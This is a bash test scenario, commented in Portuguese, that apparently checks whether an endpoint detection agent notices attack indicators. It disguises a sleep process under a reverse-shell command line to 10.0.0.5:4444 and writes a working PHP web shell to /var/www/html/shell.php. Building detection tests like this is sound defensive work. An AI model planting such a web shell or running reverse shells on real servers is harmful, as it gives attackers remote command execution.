#!/usr/bin/env bash
# endpoint web-01: shell reverso + web shell
# rodar dentro do agente: docker compose exec -T agent_web bash -s < tests/scenarios/web.sh
set -u
spoof() { bash -c "exec -a \"$1\" sleep 60" >/dev/null 2>&1 & }   # processo vivo com ioc na cmdline
step()  { sleep 3; }                                            # garante batch separado

echo "[web-01] (1) shell reverso classico"
spoof "bash -i /dev/tcp/10.0.0.5/4444"
step

echo "[web-01] (2) web shell: servidor web ativo + .php em /var/www"
spoof "nginx: worker process"
step
mkdir -p /var/www/html
printf '<?php system($_GET["c"]); ?>\n' > /var/www/html/shell.php
step

echo "[web-01] concluido"
